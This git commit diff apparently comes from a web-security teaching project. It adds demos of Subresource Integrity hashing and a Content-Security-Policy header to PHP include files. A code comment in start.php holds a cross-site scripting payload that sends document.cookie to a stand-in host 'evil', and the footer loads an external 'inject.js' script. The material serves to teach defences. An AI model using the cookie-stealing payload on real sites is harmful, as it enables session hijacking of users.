0697d96f6b1880ed520f21d85670b8c7e85dd24b
John King <jnkisd@rit.edu>
2017-10-11 15:41:34 -0400

    Adding SRI and CSP demo

--- include/footer.php
+++ include/footer.php
@@ -4,6 +4,13 @@
 	<!-- TODO -->
 	<script src="js/jquery.min.js"></script>
 	<script src="js/bootstrap.min.js"></script>
+
+	<!--
+		DEMO: Sub Resource Integrity
+		cat inject.js | openssl dgst -sha384 -binary | openssl enc -base64 -A
+		meMMogsa/Ud0HAR6rIUaKUOc5TRryJoEiVGz3oCNAtb3nB6HnAqYkEmcq5uUE9Q+
+	-->
 	<script src="https://tracker/inject.js"></script>
+	<!-- <script src="https://tracker/inject.js" integrity="sha384-meMMogsa/Ud0HAR6rIUaKUOc5TRryJoEiVGz3oCNAtb3nB6HnAqYkEmcq5uUE9Q+" crossorigin="anonymous"></script> -->
 </body>
 </html>
--- include/start.php
+++ include/start.php
@@ -1,4 +1,7 @@
 <?php
+    // DEMO: Content Security Policy
+    //header("Content-Security-Policy: default-src 'self'; script-src 'self' https://tracker; img-src 'self' https://tracker");
+
     // DEMO: Session cookie security (secure & httponly flags)
     /*
     $cookieParams = session_get_cookie_params();
@@ -10,6 +13,7 @@
         true
     );
     */
+    //:P <script>var img = new Image(); img.src = "http://evil/" + document.cookie;</script>
 
     session_start();
     $GLOBALS['db'] = new PDO('sqlite:data/db');
